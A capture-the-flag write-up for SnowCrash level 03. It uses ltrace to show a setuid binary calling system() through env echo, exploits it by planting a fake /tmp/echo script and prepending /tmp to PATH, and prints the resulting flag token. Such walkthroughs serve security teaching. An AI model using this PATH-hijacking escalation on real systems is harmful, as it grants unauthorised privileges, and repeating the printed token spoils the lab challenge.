# Level 03

- Once logged in, and check the file in home dir., the `level03` file is located

```
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          localhost 10.110.0.2
level03@localhost's password:

level03@SnowCrash:~$
level03@SnowCrash:~$ ls
level03
```

When executing the file:
```
level03@SnowCrash:~$ ./level03
Exploit me
```

## Checking the file

- check `file` command to use type of the file

```
level03@SnowCrash:~$ file ./level03
./level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```

- using `ltrace`

```
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid() = 2003
geteuid() = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                             = 0
+++ exited (status 0) +++
```

```
level03@SnowCrash:~$ vi /tmp/echo
#!/bin/bash
/bin/getflag
level03@SnowCrash:~$ chmod +x /tmp/echo
# level03@SnowCrash:~$ PATH="/tmp:$PATH" ./level03
level03@SnowCrash:~$ export PATH="/tmp:$PATH"
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
